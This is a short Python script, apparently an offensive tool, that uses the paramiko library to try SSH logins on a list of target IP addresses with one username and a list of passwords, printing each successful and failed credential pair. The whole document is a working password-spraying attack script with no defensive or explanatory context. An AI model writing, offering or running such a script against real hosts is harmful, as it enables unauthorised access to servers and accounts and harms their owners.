import paramiko

def password_spray(target_ips, username, password_list):
    for ip in target_ips:
        for password in password_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password)
                print(f"Successful login on {ip} with {username}:{password}")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print(f"Failed login on {ip} with {username}:{password}")
            except Exception as e:
                print(f"Error on {ip}: {e}")
